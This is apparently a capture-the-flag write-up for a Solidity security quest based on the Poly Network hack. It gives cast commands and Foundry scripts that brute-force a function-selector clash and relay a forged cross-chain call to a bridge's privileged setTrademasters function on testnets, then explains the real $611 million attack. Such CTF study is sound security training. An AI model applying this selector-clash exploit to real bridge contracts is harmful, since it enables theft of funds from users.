---
title: "Poly Network Rekt"
date: "2024-02-14T16:57:00.000Z"
lastmod: "2024-02-14T17:10:00.000Z"
draft: false
featuredImage: "https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b\
  7f7-443a-aca8-598247fb6d93/49b1753b-3215-43e4-84b8-59e8018eea6a/Poly_Rekt_pre\
  lude_1200px_3471026003.webp?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sh\
  a256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-w\
  est-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171207Z&X-Amz-Expires=3600&X-Am\
  z-Signature=71f6a5bc47842546b58575a5a6f5fb1c9dae95ed74c6ff80349a9f98e951bf35&\
  X-Amz-SignedHeaders=host&x-id=GetObject"
weight: 4
difficulty: "ðŸ—¡ðŸ—¡ðŸ—¡ðŸ—¡"
language:
  - "Solidity"
level-url: "https://nodeguardians.io/dev-hub/quests/poly-rekt"
type: "docs"
skill-cat:
  - "Security"
state: "Done"
about:
  - "ctf"
prev: "Cream-Finance-Rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d"
NOTION_METADATA:
  object: "page"
  id: "b7b8b118-20c2-49bc-b1f9-6a50fc20d478"
  created_time: "2024-02-14T16:57:00.000Z"
  last_edited_time: "2024-02-14T17:10:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover:
    type: "file"
    file:
      url: "https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-a\
        ca8-598247fb6d93/49b1753b-3215-43e4-84b8-59e8018eea6a/Poly_Rekt_prelude\
        _1200px_3471026003.webp?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-\
        Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F2024021\
        4%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171205Z&X-Amz-Exp\
        ires=3600&X-Amz-Signature=c433cbd7650be6a3102d1f4d44d2bd08f930bad9d9adc\
        fe232b3a1568d21124c&X-Amz-SignedHeaders=host&x-id=GetObject"
      expiry_time: "2024-02-14T18:12:05.923Z"
  icon:
    type: "emoji"
    emoji: "âœ…"
  parent:
    type: "database_id"
    database_id: "67ccfb28-aa7e-4248-9272-3d9732e4a83e"
  archived: false
  properties:
    weight:
      id: "%3BQ%60q"
      type: "number"
      number: 4
    difficulty:
      id: "%3DCqv"
      type: "status"
      status:
        id: "qV=s"
        name: "ðŸ—¡ðŸ—¡ðŸ—¡ðŸ—¡"
        color: "red"
    language:
      id: "Py%7Cy"
      type: "multi_select"
      multi_select:
        - id: "d01ac056-199f-4b78-96ee-583126c15462"
          name: "Solidity"
          color: "blue"
    next:
      id: "%60Q~a"
      type: "rich_text"
      rich_text: []
    level-url:
      id: "cjvw"
      type: "url"
      url: "https://nodeguardians.io/dev-hub/quests/poly-rekt"
    type:
      id: "khE_"
      type: "select"
      select:
        id: "Qq?l"
        name: "docs"
        color: "default"
    skill-cat:
      id: "n%7CzF"
      type: "multi_select"
      multi_select:
        - id: "8fe662a4-5f8b-4be9-8013-c00b51082782"
          name: "Security"
          color: "green"
    state:
      id: "sW%3AG"
      type: "status"
      status:
        id: "372c6056-56a9-4d05-861f-a165f80174eb"
        name: "Done"
        color: "green"
    about:
      id: "vf%7DG"
      type: "multi_select"
      multi_select:
        - id: "8003f5ac-a320-4dd2-8d86-081c00f91f54"
          name: "ctf"
          color: "red"
    prev:
      id: "~LUC"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Cream-Finance-Rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Cream-Finance-Rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d"
          href: null
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Poly Network Rekt"
            link: null
          annotations:
            bold: true
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Poly Network Rekt"
          href: null
  url: "https://www.notion.so/Poly-Network-Rekt-b7b8b11820c249bcb1f96a50fc20d478"
  public_url: null
UPDATE_TIME: "2024-02-14T17:12:12.469Z"
EXPIRY_TIME: "2024-02-14T18:12:06.732Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/01477dc9-56d4-448b-bb5b-a05aba278bf2/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171206Z&X-Amz-Expires=3600&X-Amz-Signature=ad6da3efb7b2d4609162382a8efb477b597019891048e91eb2c2cdc01cf81840&X-Amz-SignedHeaders=host&x-id=GetObject)


First here the the boat address on Goerli (the target contract we have to interact with):


```solidity
cast call $TRADING_BOAT_GOERLI --rpc-url $RPC_URL_GOERLI "tradingData()(address)"
 
> 0xFDDa11C6504db2Cf760F3cb53253D88cF8A5a593
```


Now we can try to interact with the bridge contract on Fuji chain:


```solidity
cast send $TRADING_BOAT_FUJI  --private-key $PRIVATE_KEY --rpc-url $RPC_URL_FUJI "sendShipment(string,bytes32[],uint64,address)(bytes32)" "setTrademasters" [0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6] 0x5 $TRADING_DATA_GOERLI
```


output:


```solidity
0x97bc653aac2c7b476cefe65e9df32d34caf31f670e4f36a441000963f8df3a37
```


Now we can call the offchain trademaster to generate a signature:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/ac89d8dd-d421-4426-a48a-9845d6295511/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171206Z&X-Amz-Expires=3600&X-Amz-Signature=933d46c94c742b4fc0a68452943ada87a73bd48d735c8e20a1fa568e013b858d&X-Amz-SignedHeaders=host&x-id=GetObject)


```solidity
Signature: 0x265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c
```


Letâ€™s create a script to automate the process:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c";
        boat.relayShipment("setTrademasters", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```


Now we can relay the message on the goerli chain using the following script:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"265d347b6819c4aa0de6f96f9874b9e78a1b2ad38d16068196ed532eb4d9f96c063a6779057b5cef1ecfb3752a4789bfae1e53cf073adef07ba928cf01a38c401c";
        boat.relayShipment("setTrademasters", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```


without a surprise the contract revert :


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/3f4739aa-a29a-46d3-b7e3-f6905d9db757/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171206Z&X-Amz-Expires=3600&X-Amz-Signature=ce02bffaf5db69658d632eb56aa004c5a48ebe86c19d30731b44893ed761669b&X-Amz-SignedHeaders=host&x-id=GetObject)


This is because the relay function add some params (bytes32[],uint64,address) that we donâ€™t need and that change the function selector resulting in calling the wrong method on the target contract:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/4f32ddf8-fe57-441b-ba74-95b1c9f1061e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171206Z&X-Amz-Expires=3600&X-Amz-Signature=bf56d3d2c9595203b18a8f6ec220bfe55fdab23eaa76daffafeed7d804f145fe&X-Amz-SignedHeaders=host&x-id=GetObject)


We can see on the error message above that we call the selector `0x3b2e7145` whereas we were expecting to call `0xef51774d` :


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/b4a0a8cc-58ff-40aa-95cb-a077dcaab6a6/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T171206Z&X-Amz-Expires=3600&X-Amz-Signature=fd4be5149049787af70849be577b0671d615004414e390d8e44a8c7477e47aa4&X-Amz-SignedHeaders=host&x-id=GetObject)


Now we know that itâ€™s pretty much straight forward what we have to do: brutforce the _method params so that __`abi.ecodePacked(_`_`method, (bytes32[], uint64, address)` result in the `0xef51774d` selector.


In order to do that I installed the following program that seems to do the job:


[link_preview](https://github.com/botdad/power-clash)


```bash
> docker run --rm power-clash -a bytes32[],uint64,address -s ef51774d -p setTrademasters
> Attempting to find setTrademasters******(bytes32[],uint64,address) match for 0xef51774d in 19770609664 max permutations
> Calculating 6277782.5 permutations per second
> Found match in 902.78942008s
> setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d
```


and Bingo! we have it : `setTrademastersLMuGgO(bytes32[],uint64,address) hashes to 0xef51774d`


Now we can do the say process as before but using the new function name.


Here is the signature we got:


```bash
Signature: 0xeb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c
```


fuji.s.sol


```bash
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address TRADING_BOAT_FUJI = vm.envAddress("TRADING_BOAT_FUJI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_FUJI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes32 bridgeHash = boat.sendShipment("setTrademastersLMuGgO", params, 5, TRADING_DATA_GOERLI);
        console.logBytes32(bridgeHash);

        vm.stopBroadcast();
    }
}
```


goerli.s.sol


```bash
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {TradingBoat} from '../contracts_/TradingBoat.sol';

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address PUBLIC_KEY = vm.envAddress("PUBLIC_KEY");
        address TRADING_BOAT_GOERLI = vm.envAddress("TRADING_BOAT_GOERLI");
        address TRADING_DATA_GOERLI = vm.envAddress("TRADING_DATA_GOERLI");

        vm.startBroadcast(deployerPrivateKey);

        TradingBoat boat = TradingBoat(TRADING_BOAT_GOERLI);
        bytes32[] memory params = new bytes32[](1);
        params[0] = 0x000000000000000000000000122C0492CEa0241cDfD7A11469e3434D24889Cc6;
        bytes memory signature = hex"eb8f7dc8da0fce482b52e20d85dc0f602c2932acea3170e3f4cea0a752855545505ac6ff2587c7d4d43b4936361832c4fd54c7a2a75d3f63efd23190f735f7771c";
        boat.relayShipment("setTrademastersLMuGgO", params, 43113, PUBLIC_KEY, TRADING_DATA_GOERLI, signature);

        vm.stopBroadcast();
    }
}
```


## **Poly Network**


Poly Network is a cross-chain protocol that facilitates cross-chain interaction between otherwise disconnected blockchains.


Poly Network is more advanced than King Baku's network. For instance, it uses merkle roots to batch cross-chain transactions, and a multi-signature scheme to improve decentralization.


However similar to ourÂ `TradingBoat`Â contracts, Poly Network partitions its cross-chain contracts into 2 entities:


1.Â `EthCrossChainManager`Â which handles the cross-chain verification and execution logic.


2.Â `EthCrossChainData`Â which manages important information regarding cross-chain trademasters and calls.


The partition allows Poly Network to upgradeÂ `EthCrossChainManager`Â via proxy, while assertingÂ `EthCrossChainData`Â as immutable.


## **Privilege Escalation Attack**


The attack onÂ `TradingBoat`Â and Poly Network is enabled by the same two underlying reasons.

- The manager contract (`TradingBoat`/`EthCrossChainManager`) has access to some privileged external function (`setTrademasters()`/`putCurEpochConPubKeyBytes()`).
- The manager contract can call any function in any contract via selector clashing.

Consequently, a malicious attack can search for a selector clash that forces the manager contract to call the privileged external function, and invoke unexpected effects.


Poly Network has lost $611 million to this form of privilege escalation attack. Fortunately, the hacker has since return the stolen funds for a bug bounty reward.

